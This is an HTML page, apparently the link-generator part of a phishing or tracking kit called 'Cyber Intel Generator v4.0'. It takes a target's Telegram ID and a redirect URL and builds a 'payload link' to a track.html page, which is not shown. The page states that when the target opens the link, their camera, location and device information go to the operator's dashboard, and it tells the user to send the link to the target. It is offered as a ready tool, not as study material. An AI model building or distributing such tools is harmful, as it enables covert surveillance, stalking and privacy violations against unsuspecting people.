<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cyber Intel | Generator</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { background: #f8fafc; color: #1e293b; font-family: 'Plus Jakarta Sans', sans-serif; }
        
        .card-ui { 
            background: white; 
            border: 1px solid #f1f5f9; 
            box-shadow: 0 20px 50px rgba(0,0,0,0.05); 
        }

        .input-style { 
            background: #f8fafc; 
            border: 2px solid #f1f5f9; 
            padding: 16px; 
            border-radius: 16px; 
            width: 100%; 
            outline: none; 
            transition: 0.3s; 
            color: #2563eb; 
            font-weight: 600;
        }
        .input-style:focus { border-color: #3b82f6; background: white; }

        /* PURANA BLUE GLOW BUTTON */
        .btn-generate {
            background: white;
            color: #2563eb;
            border: 2px solid #dbeafe;
            transition: all 0.3s ease;
        }
        .btn-generate:hover {
            background: #2563eb;
            color: white !important;
            box-shadow: 0 10px 25px rgba(37, 99, 235, 0.3);
            transform: translateY(-2px);
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-6">

    <div class="max-w-md w-full card-ui p-8 rounded-[2.5rem]">
        <div class="flex items-center gap-3 mb-6">
            <div class="h-12 w-12 bg-blue-50 rounded-2xl flex items-center justify-center text-blue-600 border border-blue-100">
                <i class="fa-solid fa-satellite-dish text-xl"></i>
            </div>
            <div>
                <h1 class="text-2xl font-black italic text-blue-600 leading-none">CYBER<span class="text-slate-800">INTEL</span></h1>
                <p class="text-[9px] text-slate-400 font-black uppercase tracking-widest">Generator v4.0</p>
            </div>
        </div>

        <div class="space-y-6">
            <div>
                <label class="text-[10px] font-black text-slate-400 uppercase ml-2 tracking-widest">Target Telegram ID</label>
                <input type="text" id="tgID" placeholder="Enter ID (e.g. 58293021)" class="input-style mt-1">
            </div>

            <div>
                <label class="text-[10px] font-black text-slate-400 uppercase ml-2 tracking-widest">Redirect After Capture</label>
                <input type="text" id="redURL" placeholder="https://youtube.com" class="input-style mt-1">
            </div>

            <button onclick="generateLink()" class="btn-generate w-full py-5 rounded-2xl font-black uppercase text-xs tracking-widest shadow-sm">
                <i class="fa-solid fa-wand-magic-sparkles mr-2"></i> Create Tracking Link
            </button>

            <div id="result" class="hidden mt-6 p-6 border-2 border-dashed border-blue-100 rounded-3xl bg-blue-50/30">
                <p class="text-[10px] text-blue-600 font-black mb-3 uppercase tracking-widest">Payload Link Generated:</p>
                <div class="flex items-center gap-2 bg-white p-3 rounded-xl border border-blue-100">
                    <input type="text" id="finalLink" readonly class="w-full bg-transparent text-xs font-mono text-slate-600 outline-none">
                    <button onclick="copyLink()" class="text-blue-600 hover:text-blue-800"><i class="fa-solid fa-copy"></i></button>
                </div>
                <p class="text-[9px] text-slate-400 mt-3 italic leading-relaxed">
                    <i class="fa-solid fa-circle-info mr-1"></i> 
                    When the target opens this link, their <b>Camera, Location, and Device Info</b> will be sent to your dashboard.
                </p>
            </div>
        </div>
        
        <button onclick="window.location.href='dashboard.html'" class="w-full mt-6 text-slate-400 font-bold text-[10px] uppercase tracking-widest hover:text-slate-600 transition-all">
            <i class="fa-solid fa-arrow-left mr-1"></i> Back to Control Center
        </button>
    </div>

    <script>
        function generateLink() {
            const tg = document.getElementById('tgID').value;
            const red = encodeURIComponent(document.getElementById('redURL').value || "https://google.com");
            
            if(!tg) {
                alert("Please enter a Telegram ID to receive logs!");
                return;
            }

            // Yeh link 'track.html' ko point karega jisme asli tracking code hoga
            const link = window.location.origin + "/track.html?tid=" + tg + "&rd=" + red;
            
            document.getElementById('finalLink').value = link;
            document.getElementById('result').classList.remove('hidden');
        }

        function copyLink() {
            const copyText = document.getElementById("finalLink");
            copyText.select();
            document.execCommand("copy");
            alert("Link copied! Send it to the target.");
        }
    </script>
</body>
</html>
